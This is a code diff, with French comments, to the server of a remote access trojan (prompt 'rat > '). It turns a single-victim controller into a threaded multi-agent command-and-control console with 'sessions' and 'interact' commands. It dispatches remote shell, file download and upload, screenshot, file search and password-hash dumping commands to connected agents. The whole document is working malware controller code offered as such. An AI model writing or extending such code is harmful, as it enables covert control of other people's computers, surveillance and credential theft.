@@ -4,8 +4,25 @@ import ssl
 import os
 import subprocess
 from dotenv import load_dotenv
+import threading
 
 SERVER_PORT = 8888
+agents = {}
+agent_id = 1
+agent_lock = threading.Lock()
+
+def handle_client(client_socket, client_address, agent_id, nb_screenshot):
+    global agents
+    client_ip, client_port = client_address
+    print(f"[+] Agent {agent_id} received from {client_ip}:{client_port}!")
+
+    # Ajouter l'agent à la liste des agents actifs
+    with agent_lock:
+        agents[agent_id] = (client_socket, client_address, nb_screenshot)
+
+    while True:
+        # Attente d'une commande de la part de l'utilisateur principal
+        pass  # Laisser cette boucle en attente
 
 # Fonction permettant de récupérer la liste des commandes disponibles
 def menu_help(client_socket):
@@ -137,6 +154,7 @@ def hashdump(client_socket):
     print(f'\n{hashdump_received}')  # Affichage des données hashdump
 
 def main():
+    global agent_id
     # Récupération et définition des variables
     load_dotenv()
     ip_server = os.getenv('IP_SERVER')
@@ -151,45 +169,76 @@ def main():
     # Création du socket TCP pour la connexion au serveur
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server_socket.bind((ip_server, SERVER_PORT))  # Définition de l'adresse et du port d'écoute du serveur
-    server_socket.listen(1)  # Mise en écoute du socket
+    server_socket.listen(5)  # Mise en écoute du socket, 5 connexions en attente max
 
     print(f"[*] Listening on {SERVER_PORT}...")
 
-    # Enveloppement du socket avec SSL pour sécuriser la communication
-    with context.wrap_socket(server_socket, server_side=True) as ssl_socket:
-        # Attente d'une connexion entrante et acceptation de celle-ci
-        client_socket, client_address = ssl_socket.accept()
-        client_ip, client_port = client_socket.getpeername()  # Récupération de l'adresse IP du client
-        print("[+] Agent received!")
+    while True:
+        # Enveloppement du socket avec SSL pour sécuriser la communication
+        client_socket, client_address = server_socket.accept()
+        ssl_socket = context.wrap_socket(client_socket, server_side=True)
+        
+        with agent_lock:
+            current_agent_id = agent_id
+            agent_id += 1
 
-        # Gestion des commandes envoyées au client
-        while True:
-            command = input("rat > ")
-            if command.lower() == 'help':
+        # Créer un thread pour gérer le client
+        client_handler = threading.Thread(
+            target=handle_client,
+            args=(ssl_socket, client_address, current_agent_id, nb_screenshot)
+        )
+        client_handler.start()
+
+def manage_sessions():
+    global agents
+    agent_selected = None
+
+    while True:
+        command = input("rat > ").strip().lower()
+        if command == 'sessions':
+            print("[*] Sessions:")
+            with agent_lock:
+                for agent_id in agents:
+                    print(f"[*] Agent {agent_id}")
+        elif command.startswith('interact '):
+            try:
+                agent_selected_id = int(command.split()[1])
+                with agent_lock:
+                    if agent_selected_id in agents:
+                        agent_selected = agent_selected_id
+                        print(f"[*] Connection à l'Agent {agent_selected}")
+                    else:
+                        print(f"[!] Agent {agent_selected_id} inconnu.")
+            except (IndexError, ValueError):
+                print("[!] Commande non reconnue")
+                print("[*] Taper 'interact' puis le numéro de l'agent pour s'y connecter.")
+        elif agent_selected:
+            client_socket, client_address, nb_screenshot = agents[agent_selected]
+            if command == 'help':
                 menu_help(client_socket)
-            elif command.lower() == 'download':
+            elif command == 'download':
                 download(client_socket)
-            elif command.lower() == 'upload':
+            elif command == 'upload':
                 upload(client_socket)
-            elif command.lower() == 'shell':
-                shell(client_socket, client_ip)
-            elif command.lower() == 'ipconfig':
+            elif command == 'shell':
+                shell(client_socket, client_address[0])
+            elif command == 'ipconfig':
                 ipconfig(client_socket)
-            elif command.lower() == 'screenshot':
-                nb_screenshot = screenshot(client_socket, nb_screenshot)
-            elif command.lower() == 'search':
+            elif command == 'screenshot':
+                agents[agent_selected] = (client_socket, client_address, screenshot(client_socket, nb_screenshot))
+            elif command == 'search':
                 search(client_socket)
-            elif command.lower() == 'hashdump':
+            elif command == 'hashdump':
                 hashdump(client_socket)
-            elif command.lower() == 'exit':
+            elif command == 'exit':
                 client_socket.send(b'exit')
                 break
             else:
                 print("[!] Commande non reconnue")  # Gestion des saisies utilisateur
                 print("[*] Taper 'help' pour voir la liste des commandes disponibles")
-
-        client_socket.close()  # Fermeture du socket client
-    server_socket.close()  # Fermeture du socket serveur
+        else:
+            print("[!] No agent selected. Use 'interact <agent_id>' to select an agent.")
 
 if __name__ == "__main__":
-    main()
+    threading.Thread(target=main).start()
+    manage_sessions()
